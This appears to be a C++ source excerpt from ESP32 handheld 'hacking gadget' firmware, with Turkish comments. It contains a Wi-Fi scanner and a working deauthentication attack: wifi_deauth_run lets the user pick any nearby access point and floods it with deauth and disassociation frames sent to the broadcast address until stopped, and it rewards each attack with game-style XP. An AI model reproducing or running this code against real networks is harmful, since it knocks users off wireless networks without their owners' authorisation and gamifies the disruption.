static void wifi_scan_run() {
    wifiScanAll(true);
    WiFi.scanDelete();
    if (g_scanResults.empty()) { dispBanner("No networks found"); return; }

    while (true) {
        OptionList nets;
        for (auto& ap : g_scanResults) {
            String label = ap.ssid.isEmpty() ? "[hidden]" : ap.ssid;
            label += " " + String(ap.rssi) + "dB";
            nets.push_back({label, [](){}});
        }
        nets.push_back({"[Rescan]", [](){}});
        nets.push_back({"Back", [](){}});

        int sel = loopOptions(nets, "WiFi Scan");
        if (sel < 0 || sel == (int)nets.size()-1) break;
        if (sel == (int)nets.size()-2) { wifiScanAll(true); continue; }

        APInfo& ap = g_scanResults[sel];
        dispClear();
        dispStatusBar("AP Detail");
        dispText(0, 12, "SSID: " + (ap.ssid.isEmpty() ? "[hidden]" : ap.ssid));
        dispText(0, 22, "BSSID: " + ap.bssid);
        dispText(0, 32, "RSSI: " + String(ap.rssi) + " dBm");
        dispText(0, 42, "Ch:" + String(ap.channel) + "  " + encTypeName(ap.encType));
        dispText(0, 54, "[BTN] back");
        dispCommit();
        while (!readButton()) delay(50);
    }
    WiFi.mode(WIFI_OFF);
}

static void wifi_deauth_run() {
    showOpScreen(FzOpIcon::DolphinWait, "WiFi Scanning...", 0);
    wifiScanAll(true);
    WiFi.scanDelete();
    if (g_scanResults.empty()) { dispBanner("No networks"); return; }

    OptionList nets;
    for (auto& ap : g_scanResults)
        nets.push_back({ap.ssid + " ch" + String(ap.channel), [](){}});
    nets.push_back({"Back", [](){}});

    int sel = loopOptions(nets, "Deauth: Select AP");
    if (sel < 0 || sel >= (int)g_scanResults.size()) { WiFi.mode(WIFI_OFF); return; }

    APInfo& tgt = g_scanResults[sel];
    uint8_t bssid[6];
    macFromStr(tgt.bssid, bssid);

    wifiInitForRawTx();

    uint32_t pkts = 0;
    uint32_t lastDraw = 0;

    while (!readButtonLong()) {
        for (uint8_t b = 0; b < g_cfg.deauthPktsPerBurst; b++)
            sendDeauthDisassoc(bssid, BROADCAST_MAC, tgt.channel);
        // Her kombinasyon 4 frame gönderir (deauth AP→C, deauth C→AP, disassoc AP→C, disassoc C→AP)
        pkts += g_cfg.deauthPktsPerBurst * 4;
        // Her burst için XP (10 burst = 1 deauth XP sayısı artışı)
        if (pkts % (g_cfg.deauthPktsPerBurst * 4 * 10) == 0) {
            g_xpWifiCnt++;
            xpAdd(XP_PER_DEAUTH);
        }

        if (millis() - lastDraw > 200) {
            lastDraw = millis();
            // Deauth ekrani: DolphinMafia ikonu sol, bilgiler sag
            dispClear();
            // Sol: mafia ikonu
            display.drawBitmap(0, 3, FZI_DolphinMafia,
                FZI_DolphinMafia_W > 60 ? 60 : FZI_DolphinMafia_W,
                FZI_DolphinMafia_H > 60 ? 60 : FZI_DolphinMafia_H, SSD1306_WHITE);
            // Sag: bilgiler
            display.setTextColor(SSD1306_WHITE); display.setTextSize(1);
            display.setCursor(62, 0);  display.print("Deauth");
            display.setCursor(62, 10); display.print(tgt.ssid.isEmpty() ? "[hidden]" : tgt.ssid.substring(0,8));
            display.setCursor(62, 20); display.print(String(pkts) + "pkt");
            display.setCursor(62, 30); display.print("Ch:" + String(tgt.channel));
            display.setCursor(62, 52); display.print("[LONG] stop");
            dispCommit();
        }
        delay(DEAUTH_INTERVAL_MS);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    logPush("[DEAUTH] " + tgt.ssid + " frames=" + String(pkts));
    dispBanner("Sent " + String(pkts) + " frames");
}

